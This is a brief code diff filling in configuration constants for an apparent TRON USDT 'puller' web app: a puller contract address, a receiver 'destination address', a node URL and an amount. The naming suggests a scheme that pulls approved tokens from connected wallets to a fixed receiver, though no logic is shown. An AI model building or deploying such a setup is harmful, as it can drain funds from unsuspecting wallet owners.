@@ -9,8 +9,8 @@ window.Buffer = Buffer;
 const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
 const TRON_NODE = "https://api.trongrid.io";
 const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // mainnet USDT
-const PULLER_CONTRACT = "YOUR_TRONADMINPULLER_CONTRACT"; // Replace with your deployed contract
-const RECEIVER = "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB"; // destination address
+const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Replace with your deployed contract
+const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g"; // destination address
 const AMOUNT = 1000000; // 1 USDT in SUN
 const MAINNET_CHAIN_ID = "tron:0x2b6653dc";
 
